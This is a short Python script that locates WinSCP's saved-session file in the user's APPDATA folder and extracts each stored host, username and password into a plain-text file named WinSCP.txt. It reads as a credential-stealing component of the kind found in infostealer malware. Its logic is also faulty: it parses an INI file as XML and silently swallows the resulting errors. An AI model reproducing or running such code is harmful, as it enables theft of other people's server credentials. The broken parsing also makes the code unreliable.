import os
import re
import xml.etree.ElementTree as ET

folder_path = os.path.join(os.environ['APPDATA'], 'WinSCP')
ini_file_path = os.path.join(folder_path, 'WinSCP.ini')
lines_to_write = []
host_count = 0

if not os.path.exists(ini_file_path):
    exit()

try:
    with open(ini_file_path, 'r') as ini_file:
        ini_file_lines = ini_file.readlines()

    for line in ini_file_lines:
        if line.startswith("[Sessions\\"):
            session_name = re.search(r'\[Sessions\\(.+)\]', line).group(1)
            session_file_path = os.path.join(folder_path, 'WinSCP.ini')
            xml_document = ET.parse(session_file_path)
            xml_root = xml_document.getroot()

            session_node = xml_root.find(f".//configuration/session[@name='{session_name}']")
            if session_node is not None:
                url = session_node.find('host').text
                username = session_node.find('username').text
                password = session_node.find('password').text
                lines_to_write.append(f"Url: {url}\nUsername: {username}\nPassword: {password}\n\n")
                host_count += 1
except Exception:
    pass

if lines_to_write:
    with open("WinSCP.txt", "w") as file:
        file.writelines(lines_to_write)
    print(f"Found {host_count} hosts.")
